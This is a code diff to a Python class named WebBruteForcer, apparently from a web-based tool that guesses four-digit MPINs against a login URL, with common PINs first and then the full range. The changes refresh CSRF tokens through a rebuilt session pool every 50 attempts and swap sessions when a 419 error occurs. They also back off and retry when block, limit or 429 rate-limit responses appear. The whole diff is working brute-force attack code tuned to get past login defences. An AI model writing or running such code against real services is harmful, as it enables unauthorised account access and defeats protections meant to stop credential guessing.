@@ -29,11 +29,13 @@ class WebBruteForcer:
         self.session_pool = []
         self.pool_lock = threading.Lock()
         self.attempts_lock = threading.Lock()
+        self.csrf_lock = threading.Lock()
         self.rate_limit_hits = 0
         self.block_hits = 0
         self.csrf_rotations = 0
         self.response_times = []
         self.last_csrf = None
+        self.attempts_since_refresh = 0
 
     def emit_progress(self, event, data):
         socketio.emit(event, data, room=self.sid)
@@ -41,20 +43,6 @@ class WebBruteForcer:
     def wait_if_paused(self):
         while self.pause_event.is_set() and not self.stop_event.is_set():
             time.sleep(0.3)
-
-    def create_session_pool(self, size=16):
-        self.emit_progress('log', {'message': '[INIT] Spawning session pool...', 'type': 'info'})
-        # Create sessions concurrently to save startup time
-        with concurrent.futures.ThreadPoolExecutor(max_workers=8) as executor:
-            futures = [executor.submit(self._new_session) for _ in range(size)]
-            for future in concurrent.futures.as_completed(futures):
-                if self.stop_event.is_set():
-                    return False
-                result = future.result()
-                if result:
-                    self.session_pool.append(result)
-        self.emit_progress('log', {'message': f'[POOL] {len(self.session_pool)} sessions active', 'type': 'info'})
-        return len(self.session_pool) > 0
 
     def _extract_csrf(self, html):
         try:
@@ -67,15 +55,16 @@ class WebBruteForcer:
         return None
 
     def _new_session(self):
+        """Always fetch a brand new session with a fresh CSRF token."""
         try:
             session = requests.Session()
-            # FIX: reduced timeout from 8 to 5
             resp = session.get(self.url, timeout=5)
             token = self._extract_csrf(resp.text)
             if token:
-                if self.last_csrf and self.last_csrf != token:
-                    self.csrf_rotations += 1
-                self.last_csrf = token
+                with self.csrf_lock:
+                    if self.last_csrf and self.last_csrf != token:
+                        self.csrf_rotations += 1
+                    self.last_csrf = token
                 return {
                     'session': session,
                     'csrf_token': token,
@@ -85,24 +74,48 @@ class WebBruteForcer:
             pass
         return None
 
-    def _refresh_csrf_lazy(self, session_data):
+    def _refresh_all_sessions(self):
         """
-        FIX: Lazy CSRF refresh -- only called when 419 is detected,
-        not after every request. Saves one GET per PIN attempt.
+        Proactive refresh -- discard all pooled sessions and
+        rebuild the pool with fresh CSRF tokens.
+        Called every 50 attempts to prevent stale token buildup.
         """
-        try:
-            resp = session_data['session'].get(self.url, timeout=5)
-            token = self._extract_csrf(resp.text)
-            if token:
-                if self.last_csrf and self.last_csrf != token:
-                    self.csrf_rotations += 1
-                self.last_csrf = token
-                session_data['csrf_token'] = token
-                session_data['last_used'] = time.time()
-                return True
-        except Exception:
-            pass
-        return False
+        self.emit_progress('log', {
+            'message': '[CSRF] Proactive token refresh triggered',
+            'type': 'warn'
+        })
+        with self.pool_lock:
+            self.session_pool.clear()
+
+        # Rebuild pool with fresh sessions concurrently
+        new_sessions = []
+        with concurrent.futures.ThreadPoolExecutor(max_workers=6) as executor:
+            futures = [executor.submit(self._new_session) for _ in range(10)]
+            for future in concurrent.futures.as_completed(futures):
+                result = future.result()
+                if result:
+                    new_sessions.append(result)
+
+        with self.pool_lock:
+            self.session_pool.extend(new_sessions)
+
+        self.emit_progress('log', {
+            'message': f'[CSRF] Pool refreshed -- {len(new_sessions)} fresh sessions ready',
+            'type': 'info'
+        })
+
+    def create_session_pool(self, size=10):
+        self.emit_progress('log', {'message': '[INIT] Spawning session pool...', 'type': 'info'})
+        with concurrent.futures.ThreadPoolExecutor(max_workers=6) as executor:
+            futures = [executor.submit(self._new_session) for _ in range(size)]
+            for future in concurrent.futures.as_completed(futures):
+                if self.stop_event.is_set():
+                    return False
+                result = future.result()
+                if result:
+                    self.session_pool.append(result)
+        self.emit_progress('log', {'message': f'[POOL] {len(self.session_pool)} sessions active', 'type': 'info'})
+        return len(self.session_pool) > 0
 
     def get_session_from_pool(self):
         with self.pool_lock:
@@ -164,12 +177,23 @@ class WebBruteForcer:
 
         mpin_str = str(mpin).zfill(4)
 
+        # Proactive CSRF refresh every 50 attempts
+        with self.attempts_lock:
+            self.attempts_since_refresh += 1
+            do_refresh = self.attempts_since_refresh >= 50
+            if do_refresh:
+                self.attempts_since_refresh = 0
+
+        if do_refresh:
+            self._refresh_all_sessions()
+
+        # Get session with retries
         session_data = None
         for _ in range(3):
             session_data = self.get_session_from_pool()
             if session_data:
                 break
-            time.sleep(0.2)
+            time.sleep(0.3)
 
         if not session_data:
             with self.attempts_lock:
@@ -177,6 +201,7 @@ class WebBruteForcer:
             self.emit_progress('log', {'message': f'[WARN] Skipped PIN {mpin_str} -- no session', 'type': 'warn'})
             return None
 
+        # Retry same PIN up to 2 times on ambiguous response
         MAX_PIN_RETRIES = 2
         for pin_attempt in range(MAX_PIN_RETRIES):
             if self.found or self.stop_event.is_set():
@@ -190,8 +215,9 @@ class WebBruteForcer:
                 }
 
                 t_start = time.time()
-                # FIX: reduced timeout from 8 to 5
-                response = session_data['session'].post(self.url, data=post_data, timeout=5)
+                response = session_data['session'].post(
+                    self.url, data=post_data, timeout=5
+                )
                 elapsed_req = time.time() - t_start
                 self.response_times.append(elapsed_req)
 
@@ -208,18 +234,17 @@ class WebBruteForcer:
                         'speed': round(current_attempts / elapsed, 2) if elapsed > 0 else 0
                     })
 
-                # FIX: lazy CSRF refresh -- only on 419, not every request
+                # Handle 419 CSRF mismatch
                 if response.status_code == 419:
                     self.emit_progress('log', {
-                        'message': f'[CSRF] Token mismatch on {mpin_str} -- refreshing',
+                        'message': f'[CSRF] 419 on {mpin_str} -- fresh session retry',
                         'type': 'warn'
                     })
                     self.csrf_rotations += 1
-                    refreshed = self._refresh_csrf_lazy(session_data)
-                    if refreshed and pin_attempt < MAX_PIN_RETRIES - 1:
-                        continue  # retry same PIN with refreshed token
+                    session_data = self._new_session()
+                    if session_data and pin_attempt < MAX_PIN_RETRIES - 1:
+                        continue
                     else:
-                        session_data = None
                         break
 
                 try:
@@ -229,13 +254,15 @@ class WebBruteForcer:
                         return mpin_str
                     elif "blocked" in str(json_response).lower() or "limit" in str(json_response).lower():
                         self.block_hits += 1
-                        self.emit_progress('log', {'message': f'[BLOCK] Defense triggered: {json_response}', 'type': 'warn'})
+                        self.emit_progress('log', {
+                            'message': f'[BLOCK] Defense triggered: {json_response}',
+                            'type': 'warn'
+                        })
                         session_data = None
                         time.sleep(2)
                         break
                     else:
-                        # Wrong PIN -- session is still valid, return to pool as-is
-                        # No GET refresh needed unless 419 occurs
+                        # Wrong PIN -- session still valid, return as-is
                         break
 
                 except Exception:
@@ -244,13 +271,18 @@ class WebBruteForcer:
                         return mpin_str
                     elif response.status_code == 429:
                         self.rate_limit_hits += 1
-                        self.emit_progress('log', {'message': '[RATE] Rate limit hit -- throttling...', 'type': 'warn'})
+                        self.emit_progress('log', {
+                            'message': '[RATE] Rate limit -- throttling...',
+                            'type': 'warn'
+                        })
                         session_data = None
                         time.sleep(3)
                         break
                     else:
-                        # Unknown response -- discard session to be safe
-                        session_data = None
+                        # Unknown response -- get fresh session and retry
+                        session_data = self._new_session()
+                        if session_data and pin_attempt < MAX_PIN_RETRIES - 1:
+                            continue
                         break
 
             except Exception:
@@ -270,7 +302,7 @@ class WebBruteForcer:
             1001, 1002, 1003, 1005, 1006, 1007, 1008, 1009, 1011, 1012
         ]
 
-        if not self.create_session_pool(16):
+        if not self.create_session_pool(10):
             self.emit_progress('error', {'message': 'Failed to create session pool. Check the URL.'})
             return
 
@@ -320,8 +352,7 @@ class WebBruteForcer:
         tested = set(common_pins) | set(self.custom_pins)
         all_mpins = [mpin for mpin in range(10000) if mpin not in tested]
         skipped_pins = []
-        # FIX: increased chunk size from 100 to 200
-        chunk_size = 200
+        chunk_size = 50
         chunks = [all_mpins[i:i+chunk_size] for i in range(0, len(all_mpins), chunk_size)]
 
         for chunk_idx, chunk in enumerate(chunks):
@@ -330,7 +361,7 @@ class WebBruteForcer:
 
             self.wait_if_paused()
 
-            if chunk_idx % 5 == 0:
+            if chunk_idx % 10 == 0:
                 pct = int((chunk_idx / len(chunks)) * 100)
                 bar = '#' * (pct // 5) + '.' * (20 - pct // 5)
                 self.emit_progress('log', {
@@ -338,29 +369,20 @@ class WebBruteForcer:
                     'type': 'scan'
                 })
 
-            # FIX: increased workers from 8 to 16
-            with concurrent.futures.ThreadPoolExecutor(max_workers=16) as executor:
-                futures = {executor.submit(self.try_mpin, mpin): mpin for mpin in chunk}
-                for future in concurrent.futures.as_completed(futures, timeout=60):
-                    if self.stop_event.is_set() or self.found:
-                        executor.shutdown(wait=False)
-                        break
-                    try:
-                        result = future.result(timeout=10)
-                        if result:
-                            security = self.get_security_rating()
-                            elapsed = time.time() - self.start_time
-                            self.emit_progress('success', {
-                                'mpin': result, 'attempts': self.attempts,
-                                'elapsed': round(elapsed, 1), 'security': security
-                            })
-                            return
-                    except concurrent.futures.TimeoutError:
-                        original_mpin = futures[future]
-                        skipped_pins.append(original_mpin)
-                        self.emit_progress('log', {'message': f'[TIMEOUT] PIN {original_mpin:04d} queued for retry', 'type': 'warn'})
-                    except Exception:
-                        pass
+            # Sequential within chunk to respect proactive refresh every 50
+            for mpin in chunk:
+                if self.stop_event.is_set() or self.found:
+                    break
+                self.wait_if_paused()
+                result = self.try_mpin(mpin)
+                if result:
+                    security = self.get_security_rating()
+                    elapsed = time.time() - self.start_time
+                    self.emit_progress('success', {
+                        'mpin': result, 'attempts': self.attempts,
+                        'elapsed': round(elapsed, 1), 'security': security
+                    })
+                    return
 
         # Phase 4: Retry skipped
         if skipped_pins and not self.stop_event.is_set() and not self.found:
